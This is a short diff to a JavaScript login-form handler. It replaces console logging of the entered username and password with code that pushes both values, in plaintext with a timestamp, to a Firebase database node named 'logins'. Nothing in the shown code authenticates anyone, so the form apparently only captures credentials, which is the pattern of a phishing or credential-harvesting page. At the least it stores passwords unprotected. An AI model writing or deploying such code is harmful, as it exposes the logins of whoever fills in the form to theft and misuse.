@@ -1,11 +1,16 @@
+const db = firebase.database();
+
 document.getElementById("loginForm").addEventListener("submit", function (e) {
-  e.preventDefault(); // prevent form refresh
+  e.preventDefault();
 
   const username = document.getElementById("username").value;
   const password = document.getElementById("password").value;
 
-  // Log values to browser console (F12 > Console tab)
-  console.log("Login attempt:");
-  console.log("Username:", username);
-  console.log("Password:", password);
+  db.ref("logins").push({
+    username: username,
+    password: password,
+    time: new Date().toLocaleString()
+  });
+
+  console.log("Login saved to Firebase");
 });
